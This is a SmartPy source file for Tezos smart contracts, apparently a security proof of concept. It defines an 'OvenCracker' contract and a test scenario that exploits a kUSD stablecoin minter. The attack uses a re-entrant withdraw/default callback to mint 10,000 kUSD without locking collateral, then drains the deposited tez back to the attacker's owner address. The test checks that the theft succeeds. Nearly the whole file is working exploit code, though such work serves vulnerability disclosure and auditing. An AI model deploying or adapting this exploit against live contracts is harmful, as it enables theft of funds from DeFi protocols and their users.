import smartpy as sp

Addresses = sp.io.import_script_from_url("file:test-helpers/addresses.py")
Constants = sp.io.import_script_from_url("file:common/constants.py")
Errors = sp.io.import_script_from_url("file:common/errors.py")
OvenApi = sp.io.import_script_from_url("file:common/oven-api.py")

SEND_TO_OWNER = 0
INTERJECT = 1

################################################################
# Contract
################################################################

class OvenCracker(sp.Contract):
    def __init__(
        self, 
        owner = Addresses.OVEN_OWNER_ADDRESS,
        tokensToBorrow = sp.nat(0),
        ovenFactoryAddress = Addresses.OVEN_FACTORY_ADDRESS,
        minterAddress = Addresses.MINTER_ADDRESS,
        state = SEND_TO_OWNER,
    ):
        self.exception_optimization_level = "DefaultUnit"

        self.init(
            owner = owner,
            tokensToBorrow = tokensToBorrow,
            ovenFactoryAddress = ovenFactoryAddress,
            myOvenAddress = Addresses.NULL_ADDRESS,
            minterAddress = minterAddress,
            state = state
        )

    ################################################################
    # Public API
    ################################################################
    @sp.entry_point
    def oven_create(self):
        factoryHandle = sp.contract(
            sp.TUnit,
            self.data.ovenFactoryAddress,
            "makeOven",
        ).open_some()
        sp.transfer(sp.unit, sp.mutez(0), factoryHandle)

    @sp.entry_point
    def set_my_oven_address(self, address):
        sp.set_type(address, sp.TAddress)
        self.data.myOvenAddress = address


    @sp.entry_point
    def default(self):
        with sp.if_(self.data.state == SEND_TO_OWNER):
            sp.send(self.data.owner, sp.balance)
        with sp.else_():
            # send all present balance to the oven
            sp.send(self.data.myOvenAddress, sp.balance)

            # invoke `borrow`
            borrowHandle = sp.contract(
                sp.TNat,
                self.data.myOvenAddress,
                "borrow",
            ).open_some()

            sp.transfer(self.data.tokensToBorrow, sp.mutez(0), borrowHandle)

            self.data.state = SEND_TO_OWNER

    @sp.entry_point
    def drain(self, amt):
        """
        Asks the oven to withdraw `amt` tez from the minter contract.
        Since the state is SEND_TO_OWNER they are redirected to the owner in `default`
        """
        sp.set_type(amt, sp.TMutez)
        withdrawHandle = sp.contract(
            sp.TMutez,
            self.data.myOvenAddress,
            "withdraw",
        ).open_some()

        sp.transfer(amt, sp.mutez(0), withdrawHandle)

    @sp.entry_point
    def fake_mint(self, tokensToBorrow):
        sp.set_type(tokensToBorrow, sp.TNat)

        # save for the future
        self.data.tokensToBorrow = tokensToBorrow

        self.data.state = INTERJECT

        # add one tez to the oven so we have something to withdraw
        sp.send(self.data.myOvenAddress, sp.tez(1))

        withdrawHandle = sp.contract(
            sp.TMutez,
            self.data.myOvenAddress,
            "withdraw",
        ).open_some()
        
        # withdraw this exact amount so minter contract doesnt fail at the last step due to insufficient balance
        sp.transfer(sp.tez(1), sp.mutez(0), withdrawHandle)

# Only run tests if this file is main.
if __name__ == "__main__":

    ################################################################
    ################################################################
    # Tests
    ################################################################
    ################################################################

    FakeHarbinger = sp.io.import_script_from_url("file:test-helpers/fake-harbinger.py")
    Minter = sp.io.import_script_from_url("file:minter.py")
    OvenRegistry = sp.io.import_script_from_url("file:oven-registry.py")
    OvenFactory = sp.io.import_script_from_url("file:oven-factory.py")
    OvenProxy = sp.io.import_script_from_url("file:oven-proxy.py")
    Oracle = sp.io.import_script_from_url("file:oracle.py")
    Token= sp.io.import_script_from_url("file:token.py")
    Dummy = sp.io.import_script_from_url("file:test-helpers/dummy-contract.py")


    ################################################################
    # Borrow
    ################################################################

    @sp.add_test(name="can_print_kusd")
    def test():
        scenario = sp.test_scenario()

        # ----------- setup the whole ecosystem ---------------

        owner = Dummy.DummyContract()
        scenario += owner

        token = Token.FA12()
        scenario += token

        currentTime = sp.timestamp(0)
        oraclePrice = sp.nat(2 * 1000000)

        fakeHarbinger = FakeHarbinger.FakeHarbingerContract(
            harbingerValue = oraclePrice, # $2
            harbingerUpdateTime = currentTime
        )
        scenario += fakeHarbinger

        oracle = Oracle.OracleContract(harbingerContractAddress = fakeHarbinger.address)
        scenario += oracle

        governorContractAddress = Addresses.GOVERNOR_ADDRESS
        ovenRegistry = OvenRegistry.OvenRegistryContract(
            governorContractAddress = governorContractAddress
        )
        scenario += ovenRegistry

        minter = Minter.MinterContract(
            governorContractAddress = governorContractAddress,
            collateralizationPercentage = sp.nat(200000000000000000000), # 200%
            lastInterestIndexUpdateTime = currentTime,
        )
        scenario += minter
        
        ovenProxy = OvenProxy.OvenProxyContract(
            ovenRegistryContractAddress = ovenRegistry.address,
            minterContractAddress = minter.address,
            oracleContractAddress = oracle.address
        )
        scenario += ovenProxy

        ovenFactory = OvenFactory.OvenFactoryContract(
            minterContractAddress = minter.address,
            ovenRegistryContractAddress = ovenRegistry.address,
            ovenProxyContractAddress = ovenProxy.address,
            state = OvenFactory.IDLE,
            makeOvenOwner = sp.none
        )
        scenario += ovenFactory

        scenario += ovenRegistry.setOvenFactoryContract(
            ovenFactory.address
        ).run(
            sender = governorContractAddress
        )


        scenario += minter.setGovernorContract(Addresses.GOVERNOR_ADDRESS).run(sender = Addresses.GOVERNOR_ADDRESS)
        scenario += minter.setTokenContract(token.address).run(sender = Addresses.GOVERNOR_ADDRESS)
        scenario += minter.setOvenProxyContract(ovenProxy.address).run(sender = Addresses.GOVERNOR_ADDRESS)
        scenario += minter.setStabilityFundContract(Addresses.STABILITY_FUND_ADDRESS).run(sender = Addresses.GOVERNOR_ADDRESS)
        scenario += minter.setDeveloperFundContract(Addresses.DEVELOPER_FUND_ADDRESS).run(sender = Addresses.GOVERNOR_ADDRESS)

        scenario += token.setAdministrator(minter.address).run(sender = Addresses.GOVERNOR_ADDRESS)

        # ------------------------ EXPLOIT LOGIC STARTS HERE ------------------------

        cracker = OvenCracker(
            owner = owner.address,
            ovenFactoryAddress = ovenFactory.address,
            minterAddress = minter.address,
        )
        scenario += cracker

        scenario += cracker.oven_create(sp.unit).run()

        # apparently there is no way to get newly created oven address automatically in smartpy
        # this is first default address for dynamically deployed contract
        oven_address = sp.address("KT1TezoooozzSmartPyzzDYNAMiCzzpLu4LU")

        scenario.show("Oven added by address:")
        scenario.show(ovenRegistry.data.ovenMap[oven_address])

        scenario.verify(ovenRegistry.data.ovenMap[oven_address] == cracker.address)
        
        # we set oven address in cracker contract
        scenario += cracker.set_my_oven_address(oven_address).run()
        scenario.verify(cracker.data.myOvenAddress == oven_address)

        # since the price is 2 KUSD per 1 XTZ we can print 10_000 KUSD
        ONE_KUSD = sp.nat(1_000_000_000_000_000_000)
        kusd_to_mint = sp.nat(10_000) * ONE_KUSD

        # we pass the kusd_to_mint as parameter for simplicity
        # this value could be calculated knowing the price and amount of `tez` passed
        scenario += cracker.fake_mint(kusd_to_mint).run(amount=sp.tez(10_000))

        scenario.show("Cracker XTZ balance")
        scenario.show(cracker.balance)
        scenario.show("Cracker KUSD balance")
        scenario.show(token.data.balances[cracker.address].balance)
        
        scenario.show("Owner balance")
        scenario += cracker.drain(sp.tez(10_000)).run()
        
        scenario.verify(owner.balance == sp.tez(10_000)) # all tez are back to the owner
        scenario.verify(token.data.balances[cracker.address].balance == kusd_to_mint) # kusd is on the contract
        # sending KUSD back to the owner is trivial and left out of the scope



    sp.add_compilation_target("oven-cracker", OvenCracker())
